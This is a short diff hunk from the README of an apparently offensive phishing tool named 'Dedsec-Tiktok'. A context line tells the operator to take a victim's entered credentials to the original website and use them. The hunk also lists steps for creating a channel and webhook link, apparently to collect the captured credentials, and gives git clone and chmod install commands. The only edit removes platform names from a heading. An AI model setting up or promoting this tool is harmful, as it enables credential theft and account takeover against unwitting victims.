@@ -18,7 +18,7 @@ When victim enter his credentials, you need to go to original website and use th
 * create any channel
 * generate webhook link
 
-### INSTALLATION [ KALI - UBUNTU - TERMUX APP  ]
+### INSTALLATION 
 * git clone https://github.com/0xbitx/Dedsec-Tiktok.git
 * cd Dedsec-Tiktok
 * chmod +x *
